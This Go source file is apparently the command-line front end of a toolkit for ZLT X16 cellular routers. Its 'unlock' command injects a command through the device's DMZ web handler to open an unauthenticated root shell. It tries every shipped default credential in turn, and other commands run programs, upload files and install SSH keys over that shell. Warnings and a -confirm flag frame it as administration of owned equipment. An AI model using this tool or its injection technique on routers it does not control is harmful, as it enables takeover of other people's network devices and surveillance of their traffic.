// Command zltx16 provisions ZLT X16 (SDX65 / SIM8260E) CPE that you own or are
// authorised to administer.
//
// It talks to the device's own web management API, so it needs network access to
// the target's HTTP port and nothing else.
//
// AUTHORISED USE ONLY. Running "unlock" against equipment you do not own or have
// written permission to administer may be unlawful.
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/RafayGhafoor/zlt-x16-toolkit/internal/zlt"
)

const version = "0.1.0"

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	var err error
	switch os.Args[1] {
	case "probe":
		err = cmdProbe(os.Args[2:])
	case "login":
		err = cmdLogin(os.Args[2:])
	case "verify":
		err = cmdVerify(os.Args[2:])
	case "unlock":
		err = cmdUnlock(os.Args[2:])
	case "exec":
		err = cmdExec(os.Args[2:])
	case "put":
		err = cmdPut(os.Args[2:])
	case "ssh":
		err = cmdSSH(os.Args[2:])
	case "info":
		err = cmdInfo(os.Args[2:])
	case "at":
		err = cmdAT(os.Args[2:])
	case "nv":
		err = cmdNV(os.Args[2:])
	case "level":
		err = cmdLevel(os.Args[2:])
	case "features":
		err = cmdFeatures(os.Args[2:])
	case "version", "-v", "--version":
		fmt.Printf("zltx16 %s\n", version)
	case "help", "-h", "--help":
		usage()
	default:
		fmt.Fprintf(os.Stderr, "unknown command %q\n\n", os.Args[1])
		usage()
		os.Exit(2)
	}
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}

func usage() {
	fmt.Fprint(os.Stderr, `zltx16 - ZLT X16 provisioning toolkit

USAGE
  zltx16 <command> [flags]

COMMANDS
  probe     Reachability + which management ports are answering
  login     Verify web credentials and print the account tier
  verify    Check whether a passwordless root shell is already exposed
  unlock    Install a passwordless root shell via the device's DMZ handler
  exec      Run one command over an already-provisioned root shell
  put       Upload a file over an already-provisioned root shell
  ssh       Bootstrap dropbear over that shell (the firmware ships no SSH)
  info      Read-only identity: IMEI, ICCID, IMSI, module serial, firmware
  at        Send AT commands through the vendor's serialised /bin/atcmd
  nv        Read an NV item by number or EFS path (read only)
  level     Show or set account_level (what gates the web AT console)
  features  Inventory the *_SW feature switches, or enable the safe set
  version   Print version

COMMON FLAGS
  -host string        device address (default is the factory LAN address)
  -scheme string      http|https (default "http")
  -port int           management port (default 80)
  -user string        web username (default "admin"); pass '' to try every
                      shipped credential
  -pass string        web password (default "admin")
  -cgi string         CGI path override (advanced; bypasses a front shim)
  -timeout duration   per-operation timeout (default 8s)

SHELL FLAGS (exec / put / ssh)
  -shell string       host:port of the injected console (default host:23).
                      The port varies by firmware - try 23, 2233, 9876, 4444.

AUTHORISED USE ONLY.
`)
}

type common struct {
	host, scheme string
	port         int
	user, pass   string
	cgi          string
	timeout      time.Duration
}

func (c common) baseURL() string {
	if (c.scheme == "http" && c.port == 80) || (c.scheme == "https" && c.port == 443) || c.port == 0 {
		return fmt.Sprintf("%s://%s", c.scheme, c.host)
	}
	return fmt.Sprintf("%s://%s:%d", c.scheme, c.host, c.port)
}

func (c common) client() (*zlt.Client, error) {
	cl, err := zlt.NewClient(c.baseURL(), "en", c.timeout, true)
	if err != nil {
		return nil, err
	}
	if c.cgi != "" {
		cl.CGIPath = c.cgi
	}
	return cl, nil
}

func bindCommon(fs *flag.FlagSet) *common {
	c := &common{}
	fs.StringVar(&c.host, "host", zlt.DefaultHost, "device address")
	fs.StringVar(&c.scheme, "scheme", "http", "http or https")
	fs.IntVar(&c.port, "port", 80, "management port")
	fs.StringVar(&c.user, "user", zlt.DefaultUser, "web username (empty = try every shipped credential)")
	fs.StringVar(&c.pass, "pass", zlt.DefaultPass, "web password")
	fs.StringVar(&c.cgi, "cgi", "", "CGI path override (advanced; bypasses a front shim)")
	fs.DurationVar(&c.timeout, "timeout", 8*time.Second, "per-operation timeout")
	return c
}

func cmdProbe(args []string) error {
	fs := flag.NewFlagSet("probe", flag.ExitOnError)
	c := bindCommon(fs)
	_ = fs.Parse(args)

	fmt.Printf("target %s\n", c.host)
	for _, p := range []int{80, 443, 8080, 22, 23} {
		state := "closed"
		if zlt.PortOpen(c.host, p, c.timeout) {
			state = "open"
		}
		fmt.Printf("  port %-5d %s\n", p, state)
	}

	cl, err := c.client()
	if err != nil {
		return err
	}
	if raw, err := cl.Do(zlt.CmdInitPage, "GET", map[string]any{
		"cmd": zlt.CmdInitPage, "method": "GET",
	}); err == nil {
		var any map[string]any
		if json.Unmarshal(raw, &any) == nil {
			for _, k := range []string{"aeraId", "device_name", "build_type", "current_version", "sw_version"} {
				if v, ok := any[k]; ok {
					fmt.Printf("  %-14s %v\n", k, v)
				}
			}
		}
	}
	return nil
}

func cmdLogin(args []string) error {
	fs := flag.NewFlagSet("login", flag.ExitOnError)
	c := bindCommon(fs)
	_ = fs.Parse(args)

	cl, err := c.client()
	if err != nil {
		return err
	}
	res, err := cl.Login(c.user, c.pass)
	if err != nil {
		return err
	}
	if !res.Authed() {
		// Fall back through the shipped accounts. admin/admin is the ordinary
		// web user and is enough for unlock; the higher tiers exist only for UI
		// pages, so a locked-down admin password is not a dead end.
		fmt.Printf("login FAILED for %s: message=%q success=%q\n", c.user, res.Message, res.Success)
		best, attempts, cerr := cl.LoginChain(zlt.ShippedCredentials())
		for _, a := range attempts {
			if a.OK {
				continue
			}
			fmt.Printf("  rejected %-22s %s\n", a.String(), a.Message)
		}
		if cerr != nil {
			return fmt.Errorf("credentials rejected")
		}
		fmt.Printf("login OK  user=%s level=%s (%s)\n", best.User, best.Level, best.Note)
		fmt.Printf("session=%s\n", cl.SessionID)
		return nil
	}
	fmt.Printf("login OK  user=%s level=%s session=%s\n", c.user, res.UserLevel, res.SessionID)
	if level := res.UserLevel; level != "" && !zlt.LevelIsSuper(level) {
		fmt.Println("note: level 1 is not required - cmd 172 is gated on session validity, not account tier")
	}
	return nil
}

func cmdVerify(args []string) error {
	fs := flag.NewFlagSet("verify", flag.ExitOnError)
	c := bindCommon(fs)
	ports := fs.String("ports", "23,2233,9876,4444,22", "comma separated ports to probe")
	_ = fs.Parse(args)

	var list []int
	for _, s := range strings.Split(*ports, ",") {
		var p int
		if _, err := fmt.Sscanf(strings.TrimSpace(s), "%d", &p); err == nil {
			list = append(list, p)
		}
	}
	any := false
	for _, st := range zlt.VerifyOnly(c.host, list, c.timeout) {
		fmt.Println(" ", st.String())
		if st.Open && st.NoAuth {
			any = true
		}
	}
	if any {
		fmt.Println("result: a passwordless shell is exposed")
	} else {
		fmt.Println("result: no passwordless shell detected")
	}
	return nil
}

func cmdUnlock(args []string) error {
	fs := flag.NewFlagSet("unlock", flag.ExitOnError)
	c := bindCommon(fs)
	mode := fs.String("mode", zlt.ShellModeTelnet, "telnet | telnet-alt | command")
	port := fs.Int("dport", 23, "port the injected daemon listens on")
	dmz := fs.String("dmz", zlt.DefaultDMZHost, "DMZ address placed before the ';'")
	cmdStr := fs.String("cmd", "", "command to run with -mode=command")
	attempts := fs.Int("attempts", 3, "how many times to submit the DMZ write")
	vports := fs.String("verify-ports", "23,2233,9876", "ports probed for the resulting shell")
	trigger := fs.Bool("trigger", false, "if no shell appears, run the vendor applier over a console that is already reachable")
	confirm := fs.Bool("confirm", false, "required: acknowledge you are authorised to modify this device")
	_ = fs.Parse(args)

	if !*confirm {
		return fmt.Errorf("refusing to modify a device without -confirm.\n" +
			"This tool changes device state and opens an unauthenticated root shell.\n" +
			"Only run it against equipment you own or have written permission to administer")
	}

	cl, err := c.client()
	if err != nil {
		return err
	}
	orch := &zlt.UnlockOrchestrator{
		Client: cl,
		Host:   c.host,
		Opts: zlt.UnlockOptions{
			Username:     c.user,
			Password:     c.pass,
			DMZHost:      *dmz,
			Mode:         *mode,
			Port:         *port,
			Command:      *cmdStr,
			Attempts:     *attempts,
			VerifyPorts:  parseIntList(*vports),
			Trigger:      *trigger,
			ProbeTimeout: c.timeout,
		},
	}
	res, err := orch.Run()
	if err != nil {
		return err
	}

	fmt.Printf("login            %v (level %s)\n", res.LoggedIn, res.Level)
	for _, a := range res.Attempts {
		state := "rejected"
		if a.OK {
			state = "accepted"
		} else if a.Message != "" {
			state = "rejected: " + a.Message
		}
		fmt.Printf("credential       %-22s %s\n", a.String(), state)
	}
	if res.Payload != nil {
		if b, err := json.Marshal(res.Payload); err == nil {
			fmt.Printf("payload          %s\n", string(b))
		}
	}
	if res.RawReply != "" {
		fmt.Printf("device replied   %s\n", res.RawReply)
	}
	for _, n := range res.Notes {
		fmt.Printf("note             %s\n", n)
	}
	for _, s := range res.Shells {
		fmt.Printf("verify           %s\n", s.String())
	}
	if res.Succeeded {
		fmt.Println("result           ROOT SHELL AVAILABLE (no authentication)")
	} else {
		fmt.Println("result           injection sent but no shell observed")
	}
	return nil
}

// shellAddr resolves -shell (host:port) or falls back to host:port.
// parseIntList parses "23,2233,9876" into []int, skipping junk.
func parseIntList(s string) []int {
	out := []int{}
	for _, f := range strings.Split(s, ",") {
		var p int
		if _, err := fmt.Sscanf(strings.TrimSpace(f), "%d", &p); err == nil && p > 0 && p < 65536 {
			out = append(out, p)
		}
	}
	return out
}

func shellAddr(explicit, host string, port int) string {
	if explicit != "" {
		return explicit
	}
	return fmt.Sprintf("%s:%d", host, port)
}

func cmdExec(args []string) error {
	fs := flag.NewFlagSet("exec", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	_ = fs.Parse(args)

	cmdStr := strings.Join(fs.Args(), " ")
	if cmdStr == "" {
		return fmt.Errorf("usage: zltx16 exec -host <device> -shell <host>:<port> 'id'")
	}

	sh, err := zlt.DialShell(shellAddr(*shell, c.host, *sport), c.timeout)
	if err != nil {
		return err
	}
	defer sh.Close()

	out, code, err := sh.Run(cmdStr)
	if out != "" {
		fmt.Print(out)
		if !strings.HasSuffix(out, "\n") {
			fmt.Println()
		}
	}
	if err != nil {
		return err
	}
	fmt.Printf("[exit %d]\n", code)
	if code != 0 {
		return fmt.Errorf("remote command exited %d", code)
	}
	return nil
}

func cmdPut(args []string) error {
	fs := flag.NewFlagSet("put", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	mode := fs.String("mode", "0755", "remote file mode")
	_ = fs.Parse(args)

	if fs.NArg() != 2 {
		return fmt.Errorf("usage: zltx16 put [-shell host:port] [-mode 0755] <local> <remote>")
	}
	local, remote := fs.Arg(0), fs.Arg(1)

	f, err := os.Open(local)
	if err != nil {
		return err
	}
	defer f.Close()

	sh, err := zlt.DialShell(shellAddr(*shell, c.host, *sport), c.timeout)
	if err != nil {
		return err
	}
	defer sh.Close()

	// Uploads are chunked base64; a big binary needs a longer per-command budget.
	sh.Timeout = 60 * time.Second
	out, code, err := sh.RunUpload(f, remote, *mode)
	if err != nil {
		return err
	}
	fmt.Printf("put %s -> %s: %s (exit %d)\n", local, remote, strings.TrimSpace(out), code)
	return nil
}

func cmdSSH(args []string) error {
	fs := flag.NewFlagSet("ssh", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	dropbear := fs.String("dropbear", "", "local ARM32 hard-float dropbear to upload (only if the device has none)")
	authKeys := fs.String("authorized-keys", "", "authorized_keys file to install for root")
	force := fs.Bool("force", false, "re-upload dropbear even if one is present")
	dryRun := fs.Bool("dry-run", false, "print the steps without changing the device")
	_ = fs.Parse(args)

	sh, err := zlt.DialShell(shellAddr(*shell, c.host, *sport), c.timeout)
	if err != nil {
		return fmt.Errorf("%w\nhint: the injected console is not always on 23 - try -sport 2233", err)
	}
	defer sh.Close()

	var bin []byte
	if *dropbear != "" {
		bin, err = os.ReadFile(*dropbear)
		if err != nil {
			return err
		}
	}
	var keys []byte
	if *authKeys != "" {
		keys, err = os.ReadFile(*authKeys)
		if err != nil {
			return err
		}
	}

	boot := &zlt.SSHBootstrap{
		Shell: sh,
		Opts: zlt.SSHOptions{
			Dropbear:       *dropbear,
			AuthorizedKeys: keys,
			Force:          *force,
		},
		Log:    func(f string, a ...any) { fmt.Printf(f+"\n", a...) },
		DryRun: *dryRun,
	}
	done, err := boot.Run(bin)
	fmt.Println()
	for i, d := range done {
		fmt.Printf(" %2d. %s\n", i+1, d)
	}
	if err != nil {
		return err
	}
	fmt.Println()
	if zlt.VerifySSH(c.host, 22, c.timeout) {
		fmt.Println("result: ssh is listening on tcp/22")
	} else {
		fmt.Println("result: bootstrap finished but tcp/22 did not answer - re-run with the console on another port, or check iptables")
	}
	return nil
}

// dialAT opens the injected console and wraps it in an AT client.
func dialAT(c *common, shell string, sport int, allowWrites bool) (*zlt.AT, *zlt.Shell, error) {
	sh, err := zlt.DialShell(shellAddr(shell, c.host, sport), c.timeout)
	if err != nil {
		return nil, nil, fmt.Errorf("%w\nhint: the console is not always on 23 - try -sport 2233", err)
	}
	return &zlt.AT{Shell: sh, AllowWrites: allowWrites}, sh, nil
}

func cmdInfo(args []string) error {
	fs := flag.NewFlagSet("info", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	_ = fs.Parse(args)

	at, sh, err := dialAT(c, *shell, *sport, false)
	if err != nil {
		return err
	}
	defer sh.Close()

	// No AT is needed for these; the modem may be absent with no SIM.
	fw, _, _ := sh.Run("awk -F: '/^version:/{print $2}' /version 2>/dev/null")
	build, _, _ := sh.Run("grep -m1 '^build:' /version 2>/dev/null | cut -d: -f2")
	model, _, _ := sh.Run("grep -m1 '^device:' /version 2>/dev/null | cut -d: -f2")

	id := at.ReadIdentity()

	row := func(k, v string) {
		v = strings.TrimSpace(v)
		if v == "" {
			v = "(unavailable)"
		}
		fmt.Printf("%-12s %s\n", k, v)
	}
	fmt.Println()
	row("model", model)
	row("firmware", fw)
	row("build", build)
	fmt.Println()
	row("IMEI", id.IMEI)
	row("ICCID", id.ICCID)
	row("IMSI", id.IMSI)
	row("module SN", id.ModuleSN)
	fmt.Println()
	fmt.Println("IMEI is read with AT+CGSN. The write path (AT+SIMEI=) is deliberately")
	fmt.Println("not implemented: it alters identity material, is illegal in most")
	fmt.Println("jurisdictions, and a bad value breaks network attach.")
	return nil
}

func cmdAT(args []string) error {
	fs := flag.NewFlagSet("at", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	write := fs.Bool("write", false, "allow modem-policy writes (band/cell lock, PDP, ...)")
	_ = fs.Parse(args)

	cmds := fs.Args()
	if len(cmds) == 0 {
		return fmt.Errorf("usage: zltx16 at [-write] 'AT+CGSN' ['AT+CICCID' ...]")
	}

	at, sh, err := dialAT(c, *shell, *sport, *write)
	if err != nil {
		return err
	}
	defer sh.Close()

	for _, cmd := range cmds {
		if h := zlt.ATHazard(cmd); h != "" {
			fmt.Printf("warning: %s\n  %s\n", cmd, h)
		}
		res, err := at.Run(cmd)
		if res.Forbidden {
			fmt.Printf("%s\n  refused: %s\n", cmd, res.Reason)
			continue
		}
		if err != nil {
			return err
		}
		fmt.Printf("%s\n", cmd)
		for _, l := range res.Payload {
			fmt.Printf("  %s\n", l)
		}
		switch {
		case res.OK && len(res.Payload) == 0:
			fmt.Printf("  OK\n")
		case !res.OK:
			if res.Error == "" || res.Error == "ERROR" {
				fmt.Printf("  ERROR\n")
			} else {
				fmt.Printf("  ERROR: %s\n", res.Error)
			}
		}
	}
	return nil
}

func cmdNV(args []string) error {
	fs := flag.NewFlagSet("nv", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	byPath := fs.Bool("path", false, "treat the argument as an EFS path (AT+CNV) not an item number")
	_ = fs.Parse(args)

	if fs.NArg() != 1 {
		return fmt.Errorf("usage: zltx16 nv [-path] <item-number|/nv/item_files/...>")
	}
	at, sh, err := dialAT(c, *shell, *sport, false)
	if err != nil {
		return err
	}
	defer sh.Close()

	hexStr, _, err := at.ReadNV(fs.Arg(0), *byPath)
	if err != nil {
		return err
	}
	fmt.Printf("hex   %s\n", hexStr)
	if txt := zlt.NVText(hexStr); txt != "" {
		fmt.Printf("text  %s\n", txt)
	}
	return nil
}

func cmdLevel(args []string) error {
	fs := flag.NewFlagSet("level", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	set := fs.Int("set", 0, "write this tier (1 super, 2 senior, 3 ordinary)")
	_ = fs.Parse(args)

	sh, err := zlt.DialShell(shellAddr(*shell, c.host, *sport), c.timeout)
	if err != nil {
		return fmt.Errorf("%w\nhint: the console is not always on 23 - try -sport 2233", err)
	}
	defer sh.Close()

	r := &zlt.LevelReader{Shell: sh}

	if *set != 0 {
		if err := r.Set(*set); err != nil {
			return err
		}
		fmt.Printf("account_level set to %d\n\n", *set)
	}

	cur, err := r.Read()
	if err != nil {
		return err
	}
	fmt.Print(cur.String())

	if *set != 0 {
		fmt.Print("\nnote: a login resets this to the account's own tier (admin/admin -> 3).\n")
		fmt.Print("      That is why a front shim that re-asserts it per request makes AT 'appear'.\n")
	}
	if *set == 0 && cur.Current != zlt.LevelSuper {
		fmt.Print("\nsee: zltx16 level -set 1   (what the web AT console needs)\n")
	}
	_ = zlt.LevelUnlocks()
	return nil
}

func cmdFeatures(args []string) error {
	fs := flag.NewFlagSet("features", flag.ExitOnError)
	c := bindCommon(fs)
	shell := fs.String("shell", "", "host:port of the injected console (default host:23)")
	sport := fs.Int("sport", 23, "console port when -shell is not given")
	apply := fs.String("apply", "", "enable every OFF switch of this class: safe | risky")
	enable := fs.String("enable", "", "comma separated keys to turn on")
	disable := fs.String("disable", "", "comma separated keys to turn off")
	_ = fs.Parse(args)

	sh, err := zlt.DialShell(shellAddr(*shell, c.host, *sport), c.timeout)
	if err != nil {
		return fmt.Errorf("%w\nhint: the console is not always on 23 - try -sport 2233", err)
	}
	defer sh.Close()
	f := &zlt.Features{Shell: sh}

	report := func() error {
		list, err := f.List()
		if err != nil {
			return err
		}
		fmt.Println()
		for _, s := range list {
			fmt.Println(s.String())
		}
		return nil
	}

	for _, key := range splitCSV(*enable) {
		if err := f.Set(key, true); err != nil {
			return err
		}
		fmt.Printf("enabled  %s\n", key)
	}
	for _, key := range splitCSV(*disable) {
		if err := f.Set(key, false); err != nil {
			return err
		}
		fmt.Printf("disabled %s\n", key)
	}
	if len(splitCSV(*enable))+len(splitCSV(*disable)) > 0 {
		if err := f.Persist(); err != nil {
			return err
		}
		fmt.Println("persisted (mdlcfg -c)")
	}

	if *apply != "" {
		class := zlt.SwitchClass(*apply)
		if class != zlt.SwitchSafe && class != zlt.SwitchRisky {
			return fmt.Errorf("-apply takes 'safe' or 'risky'")
		}
		changed, err := f.ApplyClass(class)
		for _, k := range changed {
			fmt.Printf("enabled  %s\n", k)
		}
		if err != nil {
			return err
		}
		if len(changed) == 0 {
			fmt.Printf("nothing to do: no OFF switches in the %q class\n", class)
		} else {
			fmt.Println("persisted (mdlcfg -c)")
		}
	}

	return report()
}

func splitCSV(s string) []string {
	var out []string
	for _, p := range strings.Split(s, ",") {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}
